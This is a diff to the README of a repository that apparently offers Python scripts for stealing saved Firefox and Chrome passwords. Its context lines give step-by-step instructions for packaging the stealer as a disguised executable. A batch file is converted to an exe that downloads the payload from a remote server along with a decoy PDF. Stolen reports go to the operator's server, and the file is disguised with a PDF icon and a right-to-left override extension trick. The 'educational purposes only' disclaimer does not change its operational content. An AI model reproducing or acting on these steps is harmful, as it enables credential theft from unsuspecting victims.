@@ -2,7 +2,7 @@
 Python scripts to grab browser passwords. Currently supporting Firefox and chrome browsers.
 
 ## Information Stolen
-![Results]()
+![Results](https://github.com/HassanMahmood001/Browser-Pass-Graber/blob/main/Output/Passwords.png)
  
 
 # Note
@@ -17,9 +17,6 @@ Please note, this repo is for educational purposes only. Don't use this product 
 * Open the Payload.bat file in Bat-to-Exe converter. Enter the download links (of the exe payload you uploaded on the remote server and a pdf of your choice), convert the bat file into an exe using Bat-to-Exe converter. 
 * Using the main.py to run the executable using the python program, enter the details of your remote server where you want to recieve the reports. The python program is converted to and executable using auto-py-to-exe and a pdf icon is used for the .exe. The extension of the executable is changed using right-to-left override. 
 
-
-## Demo 
-![Results]()
 
 ## Google Form
 
